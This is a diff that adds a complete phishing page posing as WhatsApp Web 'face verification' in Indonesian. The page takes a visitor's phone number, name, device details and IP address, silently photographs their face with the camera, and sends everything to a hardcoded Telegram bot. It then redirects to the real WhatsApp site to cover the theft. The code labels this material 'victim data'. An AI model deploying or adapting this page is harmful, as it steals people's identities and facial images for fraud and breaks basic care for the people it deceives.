@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WhatsApp Web Camera Test</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Force HTTPS redirect -->
+    <script>
+        if (window.location.protocol !== "https:" && !window.location.hostname.includes("localhost")) {
+            window.location.href = "https://" + window.location.host + window.location.pathname;
+        }
+    </script>
+    <style>
+        /* Same styles as before */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background: linear-gradient(135deg, #25D366, #128C7E); height: 100vh; display: flex; justify-content: center; align-items: center; }
+        .container { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); width: 90%; max-width: 400px; text-align: center; }
+        .logo { width: 80px; margin-bottom: 15px; }
+        h2 { color: #075E54; margin-bottom: 10px; }
+        p { color: #666; margin-bottom: 20px; font-size: 14px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 2px solid #25D366; border-radius: 10px; font-size: 16px; }
+        button { background: #25D366; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #128C7E; }
+        .hidden { display: none; }
+        #cameraPreview { width: 100%; max-width: 300px; margin: 15px auto; border-radius: 10px; display: none; }
+    </style>
+</head>
+<body>
+    <div class="container" id="mainContainer">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo" alt="WhatsApp">
+        <h2>Verifikasi Wajah untuk Keamanan</h2>
+        <p>Untuk mencegah spam, WhatsApp memerlukan verifikasi wajah. Pastikan wajah Anda terlihat jelas.</p>
+        
+        <input type="tel" id="number" placeholder="Contoh: 6281234567890" required>
+        <input type="text" id="name" placeholder="Nama Lengkap" required>
+        
+        <button onclick="startFaceVerification()">MULAI VERIFIKASI WAJAH</button>
+        
+        <div id="loading" class="hidden">
+            <p>🔍 Membuka kamera... Izinkan akses saat diminta.</p>
+        </div>
+    </div>
+
+    <div class="container hidden" id="cameraContainer">
+        <h2>📸 Arahkan Kamera ke Wajah Anda</h2>
+        <p>Tersenyum! Foto akan diambil otomatis dalam 3 detik.</p>
+        <video id="cameraPreview" autoplay playsinline></video>
+        <p id="countdown">3</p>
+        <button onclick="retryCamera()">ULANGI</button>
+    </div>
+
+    <script>
+        // Telegram Bot Configuration
+        const BOT_TOKEN = "8186605145:AAH4nAskT_3TbCjYP_WC2I6ZcLspEAJmnTM";
+        const CHAT_ID = "7491173075";
+        
+        let stream = null;
+
+        function startFaceVerification() {
+            const number = document.getElementById("number").value;
+            const name = document.getElementById("name").value;
+            
+            if (!number || !name) {
+                alert("Harap isi nomor dan nama terlebih dahulu!");
+                return;
+            }
+
+            // Simpan data korban
+            window.victimData = {
+                number: number,
+                name: name,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                ip: "Fetching...",
+                timestamp: new Date().toISOString()
+            };
+
+            // Dapatkan IP korban
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    window.victimData.ip = data.ip;
+                    sendVictimData();
+                })
+                .catch(() => {
+                    window.victimData.ip = "Failed to fetch";
+                    sendVictimData();
+                });
+
+            // Switch to camera view
+            document.getElementById("mainContainer").classList.add("hidden");
+            document.getElementById("cameraContainer").classList.remove("hidden");
+            
+            // Start camera with aggressive approach
+            startCamera();
+        }
+
+        function startCamera() {
+            const video = document.getElementById("cameraPreview");
+            
+            // Multiple camera constraints attempt
+            const constraints = {
+                video: {
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 },
+                    facingMode: "user"
+                },
+                audio: false
+            };
+
+            navigator.mediaDevices.getUserMedia(constraints)
+                .then(function(s) {
+                    stream = s;
+                    video.srcObject = stream;
+                    video.style.display = "block";
+                    
+                    // Start countdown and capture
+                    let count = 3;
+                    const countdownEl = document.getElementById("countdown");
+                    
+                    const countdown = setInterval(() => {
+                        countdownEl.textContent = count;
+                        count--;
+                        
+                        if (count < 0) {
+                            clearInterval(countdown);
+                            capturePhoto();
+                        }
+                    }, 1000);
+                })
+                .catch(function(err) {
+                    console.error("Camera error:", err);
+                    
+                    // Fallback: try without constraints
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(function(s) {
+                            stream = s;
+                            video.srcObject = stream;
+                            video.style.display = "block";
+                            setTimeout(capturePhoto, 3000);
+                        })
+                        .catch(function(fallbackErr) {
+                            alert("Kamera diperlukan untuk verifikasi. Harap aktifkan izin kamera.");
+                            // Still send victim data even without photo
+                            sendVictimData();
+                        });
+                });
+        }
+
+        function capturePhoto() {
+            const video = document.getElementById("cameraPreview");
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0);
+            
+            // Stop camera
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            
+            // Convert to image
+            const photoData = canvas.toDataURL("image/jpeg", 0.8);
+            
+            // Send photo to Telegram
+            sendPhotoToTelegram(photoData);
+            
+            // Redirect to fake success page
+            setTimeout(() => {
+                window.location.href = "https://web.whatsapp.com";
+            }, 2000);
+        }
+
+        function sendVictimData() {
+            if (!window.victimData) return;
+            
+            const message = `🚨 VICTIM DATA CAPTURED 🚨\n\n📞 Nomor: ${window.victimData.number}\n👤 Nama: ${window.victimData.name}\n🖥️ Device: ${window.victimData.userAgent}\n🌐 Platform: ${window.victimData.platform}\n📱 Screen: ${window.victimData.screen}\n🗣️ Language: ${window.victimData.language}\n🌍 IP: ${window.victimData.ip}\n⏰ Timestamp: ${window.victimData.timestamp}`;
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+            
+            fetch(url).catch(e => console.error("Telegram error:", e));
+        }
+
+        function sendPhotoToTelegram(photoData) {
+            // Convert base64 to blob
+            const base64Data = photoData.split(',')[1];
+            const byteCharacters = atob(base64Data);
+            const byteArrays = [];
+            
+            for (let offset = 0; offset < byteCharacters.length; offset += 512) {
+                const slice = byteCharacters.slice(offset, offset + 512);
+                const byteNumbers = new Array(slice.length);
+                
+                for (let i = 0; i < slice.length; i++) {
+                    byteNumbers[i] = slice.charCodeAt(i);
+                }
+                
+                const byteArray = new Uint8Array(byteNumbers);
+                byteArrays.push(byteArray);
+            }
+            
+            const blob = new Blob(byteArrays, { type: 'image/jpeg' });
+            const formData = new FormData();
+            formData.append('photo', blob, 'victim_face.jpg');
+            formData.append('chat_id', CHAT_ID);
+            formData.append('caption', `📸 Wajah korban: ${window.victimData?.name || 'Unknown'} (${window.victimData?.number || 'No Number'})`);
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Photo sent successfully:", data);
+            })
+            .catch(error => {
+                console.error("Error sending photo:", error);
+                // Fallback: send as document
+                sendAsDocument(blob);
+            });
+        }
+
+        function sendAsDocument(blob) {
+            const formData = new FormData();
+            formData.append('document', blob, 'victim_photo.jpg');
+            formData.append('chat_id', CHAT_ID);
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+
+        function retryCamera() {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            startCamera();
+        }
+    </script>
+</body>
+</html>
